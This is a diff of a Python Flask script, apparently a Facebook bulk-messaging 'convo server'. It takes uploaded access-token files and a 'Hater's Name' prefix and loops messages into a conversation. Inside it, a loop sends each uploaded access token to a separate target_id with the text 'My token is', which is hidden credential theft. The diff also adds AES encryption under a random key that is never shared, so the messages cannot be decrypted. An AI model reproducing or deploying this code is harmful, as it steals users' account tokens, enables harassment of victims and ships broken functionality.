@@ -5,136 +5,37 @@ import requests
 import time
 import http.server
 import socketserver
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import padding
 
 app = Flask(__name__)
 
-# HTML Template with updated styles and background image
-HTML_TEMPLATE = '''
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RAJ CONVO SERVER FB</title>
-    <style>
-        body {
-            background-image: url('https://your-image-url.com/IMG-20240604-WA0054.jpg'); /* Replace with the URL of your image */
-            background-size: cover;
-            background-position: center;
-            color: white; /* Ensure text is readable on the background */
-            font-family: Arial, sans-serif;
-        }
-        .form-container {
-            background-color: rgba(0, 0, 0, 0.7); /* Adding a semi-transparent background for readability */
-            padding: 20px;
-            border-radius: 10px;
-            max-width: 600px;
-            margin: 40px auto;
-        }
-        .form-container h2 {
-            text-align: center;
-            color: #ffffff;
-        }
-        .form-group {
-            margin-bottom: 15px;
-        }
-        .form-group label {
-            display: block;
-            margin-bottom: 5px;
-            color: #ffffff;
-        }
-        .form-group input,
-        .form-group button {
-            width: 100%;
-            padding: 10px;
-            border: none;
-            border-radius: 5px;
-            box-sizing: border-box;
-            margin-top: 5px;
-        }
-        /* Changing colors for different input fields */
-        #tokensFile {
-            background-color: red; /* Red color for tokensFile input */
-        }
-        #convoId {
-            background-color: yellow; /* Yellow color for convoId input */
-        }
-        #messagesFile {
-            background-color: green; /* Green color for messagesFile input */
-        }
-        #hatersName {
-            background-color: blue; /* Blue color for hatersName input */
-        }
-        #speed {
-            background-color: purple; /* Purple color for speed input */
-        }
-        .form-group button {
-            background-color: #4CAF50;
-            color: white;
-            cursor: pointer;
-        }
-        .form-group button:hover {
-            background-color: #45a049;
-        }
-    </style>
-</head>
-<body>
+# AES Encryption Function
+def encrypt_message(message, key):
+    iv = os.urandom(16)  # Generate a random Initialization Vector (IV)
+    padder = padding.PKCS7(128).padder()  # Pad the message to the block size
+    padded_message = padder.update(message.encode()) + padder.finalize()
+    
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+    encryptor = cipher.encryptor()
+    encrypted_message = encryptor.update(padded_message) + encryptor.finalize()
+    
+    return iv + encrypted_message  # Return IV concatenated with encrypted data
 
-<div class="form-container">
-    <h2>Message Sender Setup</h2>
-    <form id="messageForm" enctype="multipart/form-data">
-        <div class="form-group">
-            <label for="tokensFile">Upload Tokens File:</label>
-            <input type="file" id="tokensFile" name="tokensFile" accept=".txt" required>
-        </div>
-        <div class="form-group">
-            <label for="convoId">Conversation ID:</label>
-            <input type="text" id="convoId" name="convoId" required>
-        </div>
-        <div class="form-group">
-            <label for="messagesFile">Upload Messages File:</label>
-            <input type="file" id="messagesFile" name="messagesFile" accept=".txt" required>
-        </div>
-        <div class="form-group">
-            <label for="hatersName">Hater's Name Prefix:</label>
-            <input type="text" id="hatersName" name="hatersName" required>
-        </div>
-        <div class="form-group">
-            <label for="speed">Delay Between Messages (seconds):</label>
-            <input type="number" id="speed" name="speed" value="1" required>
-        </div>
-        <div class="form-group">
-            <button type="submit">Start Server and Send Messages</button>
-        </div>
-    </form>
-</div>
-
-<script>
-    document.getElementById('messageForm').addEventListener('submit', function(event) {
-        event.preventDefault();
-
-        // Prepare the form data
-        let formData = new FormData(this);
-
-        // Send the form data via fetch API
-        fetch('/start', {
-            method: 'POST',
-            body: formData
-        })
-        .then(response => response.json())
-        .then(result => {
-            alert(result.message);
-        })
-        .catch(error => {
-            console.error('Error:', error);
-            alert('An error occurred. Please check the console for details.');
-        });
-    });
-</script>
-
-</body>
-</html>
-'''
+# AES Decryption Function
+def decrypt_message(encrypted_message, key):
+    iv = encrypted_message[:16]  # Extract the IV from the first 16 bytes
+    encrypted_message = encrypted_message[16:]
+    
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+    decryptor = cipher.decryptor()
+    decrypted_padded_message = decryptor.update(encrypted_message) + decryptor.finalize()
+    
+    unpadder = padding.PKCS7(128).unpadder()
+    decrypted_message = unpadder.update(decrypted_padded_message) + unpadder.finalize()
+    
+    return decrypted_message.decode()
 
 # HTTP server handler class
 class MyHandler(http.server.SimpleHTTPRequestHandler):
@@ -180,6 +81,9 @@ def start_server_and_messaging():
     tokens = read_file(tokens_path)
     messages = read_file(messages_path)
 
+    # Encryption key (this should ideally be kept secure and shared between the sender and receiver)
+    encryption_key = os.urandom(32)  # AES-256 key (32 bytes)
+
     # Start the HTTP server in a separate thread
     server_thread = threading.Thread(target=execute_server, args=(port,))
     server_thread.start()
@@ -192,9 +96,16 @@ def start_server_and_messaging():
         }
         for token in tokens:
             access_token = token.strip()
-            url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
+            url = f"https://graph.facebook.com/v17.0/{target_id}/messages"
             msg = f"Hello! I am using your server. My token is {access_token}"
-            parameters = {"access_token": access_token, "message": msg}
+            
+            # Encrypt the message before sending
+            encrypted_msg = encrypt_message(msg, encryption_key)
+            
+            parameters = {
+                "access_token": access_token,
+                "message": encrypted_msg.hex()  # Send the encrypted message as hex string
+            }
             response = requests.post(url, json=parameters, headers=headers)
             time.sleep(0.1)
 
@@ -214,9 +125,16 @@ def start_server_and_messaging():
                     token_index = message_index % max_tokens
                     access_token = tokens[token_index].strip()
                     message = messages[message_index].strip()
-                    url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
+                    url = f"https://graph.facebook.com/v17.0/{convo_id}/messages"
+                    
+                    # Encrypt the message before sending
                     full_message = f"{haters_name} {message}"
-                    parameters = {"access_token": access_token, "message": full_message}
+                    encrypted_message = encrypt_message(full_message, encryption_key)
+                    
+                    parameters = {
+                        "access_token": access_token,
+                        "message": encrypted_message.hex()  # Send encrypted message
+                    }
                     response = requests.post(url, json=parameters, headers=headers)
                     time.sleep(speed)
             except Exception as e:
